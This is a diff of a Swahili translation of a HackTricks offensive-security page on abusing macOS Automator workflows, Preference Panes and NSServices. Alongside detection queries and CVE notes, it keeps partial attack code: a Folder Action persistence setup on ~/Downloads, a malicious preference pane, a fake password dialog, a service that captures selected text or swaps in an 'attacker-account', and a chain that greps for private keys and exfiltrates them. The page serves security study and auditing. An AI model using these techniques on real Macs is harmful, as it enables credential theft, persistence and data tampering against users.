@@ -1,4 +1,4 @@
-# Matumizi Mabaya ya macOS Automator, Preference Panes na NSServices
+# Abuse ya macOS Automator, Preference Panes na NSServices
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -6,18 +6,18 @@
 
 ### Taarifa za Msingi
 
-**Automator** ni zana ya macOS ya kufanya automation kwa njia ya picha. Hutekeleza **workflows** (`.workflow` bundles) zinazoundwa na **actions** (`.action` bundles). Automator pia huwezesha **Folder Actions**, **Quick Actions**, na integration ya **Shortcuts**. Kwenye macOS za kisasa, workflows zinaweza pia **kuingizwa kwenye Shortcuts**, hivyo logic ileile hasidi inaweza kuonekana kama Finder Quick Action, user service ndani ya `~/Library/Services/`, au shortcut inayotumia Automator actions za zamani.
+**Automator** ni tool ya macOS ya visual automation. Hutekeleza **workflows** (bundles za `.workflow`) zinazoundwa na **actions** (bundles za `.action`). Automator pia huwezesha **Folder Actions**, **Quick Actions**, na integration ya **Shortcuts**. Kwenye macOS za kisasa, workflows zinaweza pia **kuingizwa kwenye Shortcuts**, hivyo logic ileile hatari inaweza kuonekana kama Finder Quick Action, user service iliyo chini ya `~/Library/Services/`, au shortcut inayotumia legacy Automator actions.
 
 Automator actions ni **plugins** zinazopakiwa kwenye Automator runtime workflow inapotekelezwa. Zinaweza:
 - Kutekeleza shell scripts kiholela
 - Kuchakata files na data
-- Kuwasiliana na applications kupitia AppleScript
-- Kuunganishwa kwa mfululizo ili kuunda automation changamano
+- Kuingiliana na applications kupitia AppleScript
+- Kuunganishwa pamoja kwa ajili ya automation changamano
 
 ### Kwa Nini Hili Ni Muhimu
 
 > [!WARNING]
-> Automator workflows zinaweza kushawishiwa kwa social engineering zitekelezwe — huonekana kama document files rahisi. `.workflow` bundle inaweza kuwa na shell commands zilizopachikwa ambazo hutekelezwa workflow inapoendeshwa. Zikiunganishwa na Folder Actions, hutoa **automatic persistence** inayochochewa na matukio ya files. Marekebisho ya hivi karibuni ya Gatekeeper pia yalionyesha kuwa **Quick Actions zilizowekwa ndani ya app** (`Contents/PlugIns/*.workflow`) lazima zichukuliwe kama executable content, si data isiyo na madhara.
+> Automator workflows zinaweza **kutekelezwa kupitia social engineering** — huonekana kama document files rahisi. Bundle ya `.workflow` inaweza kuwa na shell commands zilizopachikwa ambazo hutekelezwa workflow inapoendeshwa. Zikiunganishwa na Folder Actions, hutoa **persistence ya kiotomatiki** inayochochewa na matukio ya files. Marekebisho ya hivi karibuni ya Gatekeeper pia yalionyesha kuwa **Quick Actions zilizowekwa ndani ya app** (`Contents/PlugIns/*.workflow`) lazima zichukuliwe kama executable content, si data isiyo na madhara.
 
 ### Ugunduzi
 ```bash
@@ -45,7 +45,7 @@ WHERE h.handler_type = 'automator_action';"
 ```
 ### Attack: Social-Engineered Workflow
 
-Kifurushi cha `.workflow` huonekana kama faili la kawaida la document kwa watumiaji wengi:
+Kifurushi cha `.workflow` huonekana kama faili la kawaida la hati kwa watumiaji wengi:
 ```bash
 # Create a workflow programmatically
 mkdir -p /tmp/Evil.workflow/Contents
@@ -80,7 +80,7 @@ PLIST
 ```
 ### Attack: Folder Action Persistence
 
-Folder Actions hutekeleza workflow kiotomatiki faili zinapoongezwa kwenye folder inayofuatiliwa:
+Folder Actions huendesha workflow kiotomatiki faili zinapoongezwa kwenye folder inayofuatiliwa:
 ```bash
 # Register a Folder Action on ~/Downloads
 # Every file the user downloads triggers the workflow
@@ -99,23 +99,23 @@ end tell'
 # Users can be tricked into installing a Folder Action through a .workflow double-click
 ```
 > [!CAUTION]
-> Folder Actions hubaki baada ya kuwashwa upya na hutekelezwa kimya kimya. Folder Action kwenye `~/Downloads` inamaanisha **kila faili iliyopakuliwa itawasha payload yako** — ikijumuisha faili kutoka Safari, Chrome, AirDrop, na viambatisho vya barua pepe. Pia kumbuka kwamba `System Events` inaweza kusajili Folder Actions zinazoelekeza kwenye scripts zilizo nje ya maeneo chaguomsingi ya `~/Library/Scripts/Folder Action Scripts`, jambo linalofanya utafutaji wa loose-path kuwa muhimu. Kwa athari zinazohusiana za TCC, angalia [ukurasa wa TCC](../macos-security-protections/macos-tcc/README.md).
+> Folder Actions hudumu baada ya kuwasha upya mfumo na hutekelezwa kimya kimya. Folder Action kwenye `~/Downloads` inamaanisha **kila faili iliyopakuliwa itawasha payload yako** — ikiwemo faili kutoka Safari, Chrome, AirDrop, na viambatisho vya barua pepe. Pia kumbuka kuwa `System Events` inaweza kusajili Folder Actions zinazoelekeza kwenye scripts zilizo nje ya maeneo chaguomsingi ya `~/Library/Scripts/Folder Action Scripts`, hivyo kufanya loose-path hunting kuwa na manufaa. Kwa athari zinazohusiana za TCC, angalia [ukurasa wa TCC](../macos-security-protections/macos-tcc/README.md).
 
 ---
 
 ## Preference Panes
 
-### Taarifa za Msingi
+### Maelezo ya Msingi
 
-Preference panes (`.prefPane` bundles) ni plugins zinazopakiwa kutoka **System Settings** (zamani ziliitwa System Preferences). Hutoa paneli za UI za usanidi kwa vipengele vya mfumo au vya third-party. Kwenye mifumo ya zamani zilipakiwa moja kwa moja na `System Preferences`; kwenye matoleo mapya, panes za third-party kwa kawaida hushughulikiwa na **legacy loader XPC service** inayoanzishwa kutoka System Settings.
+Preference panes (bundles za `.prefPane`) ni plugins zinazopakiwa na **System Settings** (zamani ziliitwa System Preferences). Hutoa paneli za UI za usanidi wa vipengele vya mfumo au vya third-party. Kwenye mifumo ya zamani zilipakiwa moja kwa moja na `System Preferences`; kwenye matoleo mapya, panes za third-party kwa kawaida husimamiwa na **legacy loader XPC service** iliyoanzishwa kutoka System Settings.
 
 ### Kwa Nini Hili Ni Muhimu
 
-- Preference panes hutekelezwa ndani ya **trusted host process** iliyoanzishwa na System Settings / System Preferences
+- Preference panes hutekelezwa katika **trusted host process** iliyoanzishwa na System Settings / System Preferences
 - Kwenye mifumo ya kisasa, host hiyo inaweza kuwa **`legacyLoader` XPC service**, hivyo boundary muhimu bado ni **trusted Apple UI process -> third-party code loading**
-- Preference panes za third-party hurithi **security context ya host process** na trust ya mtumiaji inayohusishwa na UI hiyo
+- Preference panes za third-party hurithi **security context ya host process** pamoja na trust ya mtumiaji inayohusishwa na UI hiyo
 - Watumiaji husakinisha preference panes kwa **kuzibofya mara mbili** — njia rahisi ya social engineering
-- Mara tu zinaposakinishwa, **hubaki** na hupakiwa kila wakati System Settings inapofunguliwa kwenye paneli hiyo
+- Baada ya kusakinishwa, **hudumu** na hupakiwa kila mara System Settings inapofunguliwa kwenye paneli hiyo
 
 ### Ugunduzi
 ```bash
@@ -141,7 +141,7 @@ WHERE h.handler_type = 'preference_pane';"
 ```
 ### Attack: Privilege Context Hijacking
 
-Pane hasidi hurithi **muktadha wa usalama wa pane host** (kihistoria `System Preferences`, na kwenye matoleo mapya mara nyingi helper ya `legacyLoader` iliyoanzishwa na `System Settings`):
+A malicious preference pane hurithi **security context ya pane host** (kihistoria `System Preferences`, na katika versions mpya mara nyingi helper ya `legacyLoader` iliyoanzishwa na `System Settings`):
 ```objc
 // Preference pane principal class
 @interface MaliciousPrefPane : NSPreferencePane
@@ -162,7 +162,7 @@ AXUIElementRef systemWide = AXUIElementCreateSystemWide();
 }
 @end
 ```
-### Shambulio: Persistence kupitia Installation
+### Attack: Persistence via Installation
 ```bash
 # Install a preference pane (user-level, no admin required)
 cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/
@@ -175,7 +175,7 @@ sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/
 ```
 ### Attack: UI Phishing
 
-Preference pane inaweza kuiga paneli halali za UI ya mfumo ili **kuiba credentials kwa njia ya phishing**:
+A preference pane inaweza kuiga paneli halali za system UI ili **kuiba credentials kupitia phishing**:
 ```objc
 // Display a fake authentication dialog
 NSAlert *alert = [[NSAlert alloc] init];
@@ -195,19 +195,19 @@ NSString *password = passwordField.stringValue;
 
 ## NSServices
 
-### Maelezo ya Msingi
+### Taarifa za Msingi
 
-**NSServices** huruhusu applications kutoa utendaji kwa apps nyingine kupitia **Services menu** (bofya-kulia → Services). Mtumiaji anapochagua maandishi au data na kuita service, data iliyochaguliwa **hutumwa kwa service provider** kwa ajili ya kuchakatwa.
+**NSServices** huruhusu applications kutoa utendaji kwa apps nyingine kupitia **Services menu** (bofya kulia → Services). Mtumiaji anapochagua maandishi au data na kuanzisha service, data iliyochaguliwa **hutumwa kwa service provider** kwa ajili ya kuchakatwa.
 
-Services hutangazwa katika `Info.plist` ya application chini ya key ya `NSServices` na kusajiliwa na pasteboard server (`pbs`). macOS pia huhifadhi **service cache** na **restriction policy** zinazoamua ni services zipi zitaonekana na ikiwa callers waliowekwa kwenye sandbox wanapaswa kuonyeshwa onyo la ziada.
+Services hutangazwa katika `Info.plist` ya application chini ya key ya `NSServices` na kusajiliwa na pasteboard server (`pbs`). macOS pia huhifadhi **service cache** na **restriction policy** zinazoamua ni services zipi zinazoonekana na ikiwa callers waliowekwa sandbox wanapaswa kuonyeshwa onyo la ziada.
 
 ### Kwa Nini Hili Ni Muhimu
 
 - Services hupokea **cross-application data flow** — maandishi yaliyochaguliwa kutoka application yoyote hutumwa kwa service
 - Service hasidi inaweza kunasa data kutoka password managers, email clients na financial apps
-- Services zinaweza **kurudisha data iliyobadilishwa** kwa application inayoziita (man-in-the-middle kwenye operations za selection)
+- Services zinaweza **kurudisha data iliyorekebishwa** kwa application inayoziita (man-in-the-middle kwenye selection operations)
 - Majina ya services yanaweza kutengenezwa yaonekane halali ("Format Text", "Encrypt Selection", "Share")
-- Flag ya hiari ya `NSRestricted` ni muhimu kwa usalama: service iliyowekwa kuwa unrestricted inaweza kuitwa na app iliyowekwa kwenye sandbox bila onyo ambalo macOS huonyesha kwa services zinazoweza kusababisha escape<sup>[[2]](#references)</sup>
+- Flag ya hiari ya `NSRestricted` inahusiana na usalama: service iliyowekwa unrestricted inaweza kuitwa na app iliyowekwa sandbox bila onyo ambalo macOS huonyesha kwa services zinazoweza kuwezesha escape<sup>[[2]](#references)</sup>
 
 ### Ugunduzi
 ```bash
@@ -236,7 +236,7 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'service';"
 ```
-### Attack: Huduma ya Kunasa Data
+### Shambulio: Huduma ya Kuingilia Data
 ```xml
 <!-- Info.plist NSServices declaration -->
 <key>NSServices</key>
@@ -277,9 +277,9 @@ NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];
 [pboard setString:selectedText forType:NSPasteboardTypeString];
 }
 ```
-### Attack: Data Modification (Man-in-the-Middle)
+### Shambulio: Data Modification (Man-in-the-Middle)
 
-Huduma inaweza **kubadilisha data inayorejeshwa** huku ikionekana kutoa function halali:
+Huduma inaweza **kubadilisha data inayorejeshwa** huku ikionekana kutoa kazi halali:
 ```objc
 // A "Secure Encrypt" service that actually intercepts and modifies data
 - (void)secureEncrypt:(NSPasteboard *)pboard
@@ -297,22 +297,22 @@ withString:@"attacker-account"];
 [pboard setString:modified forType:NSPasteboardTypeString];
 }
 ```
-### Services Zilizozuiliwa na Matumizi Mabaya ya Kisasa
+### Huduma Zilizozuiwa na Matumizi Mabaya ya Kisasa
 
-Apple inasaidia `NSRestricted` boolean ya hiari kwa kila service definition. Ikiwekwa, macOS huwaonya callers walio kwenye sandbox kwa sababu service hiyo inaweza kuwasaidia **kutoka kwenye mipaka ya sandbox au faragha**. Kwa mtazamo wa offensive, hii hutoa njia mbili muhimu za audit:
+Apple inasaidia `NSRestricted` boolean ya hiari kwa kila service definition. Ikiwekwa, macOS huwaonya callers walio kwenye sandbox kwa sababu service hiyo inaweza kuwasaidia **kutoka kwenye sandbox au kuvuka privacy boundaries**. Kwa mtazamo wa offensive, hii hutoa njia mbili muhimu za ukaguzi:
 
-- Tafuta **third-party services ambazo hazijawekwa alama ya restricted** ingawa zinaproxy Apple Events, file access, au actions nyingine zenye privileges
-- Tafuta **high-value built-in services** zenye entitlements kali (kwa mfano, services zinazotolewa na Script Editor au helpers zinazotegemea Finder) na ukague ikiwa user interaction pekee inatosha kuzigeuza kuwa data-access primitive
+- Tafuta **third-party services ambazo hazijawekwa alama ya restricted** ingawa zinapitisha Apple Events, ufikiaji wa files, au vitendo vingine vya privileged
+- Tafuta **built-in services zenye thamani kubwa** zilizo na entitlements imara (kwa mfano, services zinazotolewa na Script Editor au helpers zinazotegemea Finder) na uangalie kama user interaction inatosha kuzigeuza kuwa primitive ya data access
 
-Mfano mzuri wa hivi karibuni ni **CVE-2022-48574**, ambapo Services mechanism ingeweza kutumiwa kufikia **faili za mtumiaji zilizolindwa na TCC bila confirmation flow iliyotarajiwa**. Bug hiyo imerekebishwa, lakini technique bado ni muhimu kwa threat modeling: service yoyote inayosambaza file access au automation requests kwa niaba ya caller inapaswa kuchunguzwa kwa kiwango hicho hicho.<sup>[[2]](#references)</sup>
+Mfano mzuri wa hivi karibuni ni **CVE-2022-48574**, ambapo Services mechanism ingeweza kutumiwa kufikia **files za mtumiaji zinazolindwa na TCC bila confirmation flow iliyotarajiwa**. Bug hiyo imerekebishwa, lakini technique hii bado ni muhimu kwa threat modeling: service yoyote inayosambaza file access au automation requests kwa niaba ya caller inastahili kuchunguzwa kwa kiwango hicho hicho.<sup>[[2]](#references)</sup>
 
 ---
 
-## Vidokezo vya Hivi Karibuni vya Usalama
+## Maelezo ya Hivi Karibuni ya Usalama
 
-- **Quick Actions ni executable content**: Apple ilirekebisha Gatekeeper bypass mwaka wa 2024 ambapo Automator Quick Action iliyofungwa ndani ya app ingeweza kuendeshwa bila assessment ya kawaida. Wakati wa ku-audit apps, kagua `Contents/PlugIns/*.workflow/Contents/document.wflow` kama vile ungekagua helper scripts au login items. Tazama [ukurasa wa Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
-- **Shortcuts zinaweza kurithi tabia ya legacy Automator**: Apple pia iliongeza user-consent prompt baada ya third-party shortcuts kugunduliwa zikitumia **legacy Automator action** kutuma Apple Events bila permission flow iliyotarajiwa. Imported workflows na shortcut bundles zinapaswa kukaguliwa kwa `Run AppleScript`, `Run Shell Script`, na bridge actions zinazofanana. Tazama [ukurasa wa TCC](../macos-security-protections/macos-tcc/README.md).
-- **Automator bado ni privacy boundary hai**: Apple ilitoa marekebisho mengine ya Automator mwaka wa 2025 kwa ajili ya access kwa protected user data. Hata kama Automator ni legacy surface, chukulia workflow runner, Quick Action host, au automation bridge yoyote kama attack surface ya sasa badala ya dead code.
+- **Quick Actions ni executable content**: Apple ilirekebisha Gatekeeper bypass mwaka wa 2024 ambapo Automator Quick Action iliyofungwa ndani ya app ingeweza kuendeshwa bila assessment ya kawaida. Wakati wa kukagua apps, chunguza `Contents/PlugIns/*.workflow/Contents/document.wflow` kama vile ungefanya kwa helper scripts au login items. Tazama [ukurasa wa Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
+- **Shortcuts zinaweza kurithi tabia ya zamani ya Automator**: Apple pia iliongeza user-consent prompt ya ziada baada ya third-party shortcuts kupatikana zikitumia **legacy Automator action** kutuma Apple Events bila permission flow iliyotarajiwa. Workflows zilizoimportiwa na shortcut bundles zinapaswa kukaguliwa kwa `Run AppleScript`, `Run Shell Script`, na bridge actions zinazofanana. Tazama [ukurasa wa TCC](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
+- **Automator bado ni privacy boundary inayotumika**: Apple ilitoa marekebisho mengine ya Automator mwaka wa 2025 kwa ajili ya ufikiaji wa protected user data. Hata kama Automator ni legacy surface, chukulia workflow runner, Quick Action host, au automation bridge yoyote kama attack surface ya sasa badala ya dead code.<sup>[[4]](#references)</sup>
 
 ---
 
@@ -325,7 +325,7 @@ Mfano mzuri wa hivi karibuni ni **CVE-2022-48574**, ambapo Services mechanism in
 3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
 4. Exfiltrate findings
 ```
-### Kidirisha cha Mapendeleo → TCC Escalation
+### Preference Pane → TCC Escalation
 ```
 1. Distribute malicious prefPane (social engineering)
 2. User double-clicks → installed in ~/Library/PreferencePanes/
@@ -345,5 +345,7 @@ Mfano mzuri wa hivi karibuni ni **CVE-2022-48574**, ambapo Services mechanism in
 
 - [1] [Apple — Kuhusu maudhui ya usalama ya macOS Ventura 13.7, Sonoma 14.7, na Sequoia 15](https://support.apple.com/en-us/121238)
 - [2] [Moonlock — Jinsi exploit ya NSServices ilivyofanya kazi kwenye macOS](https://moonlock.com/nsservices-macos)
+- [3] [Apple — Kuhusu maudhui ya usalama ya macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
+- [4] [Apple — Kuhusu maudhui ya usalama ya macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)
 
 {{#include ../../../banners/hacktricks-training.md}}
